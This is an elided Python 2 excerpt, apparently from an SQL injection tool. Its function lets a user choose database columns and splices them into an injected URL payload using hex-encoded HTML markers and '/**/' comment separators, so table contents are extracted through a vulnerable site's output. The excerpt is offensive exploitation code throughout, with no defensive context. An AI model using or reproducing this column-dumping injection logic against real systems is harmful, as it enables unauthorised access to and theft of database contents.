def search_in_columns(site, table, based, database):
    ...
    if total_cols:
        ...
        while total_cols > 0:
            col_choose = raw_input(
                "Give a column (give 0 to stop the procedure): ")
            ...
            if col_choose <> '0':
                if total_cols == total_cols2:
                    ...
                    site = site.replace(",/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,",
                                        ",0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,%s,/**/,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e," % col_choose)
                    total_cols = total_cols - 1
                    ks.append(col_choose)
                    k = k + 1
            else:
        ...
        if not len(total_data):
            ...
            print_data(total_data, ks, table)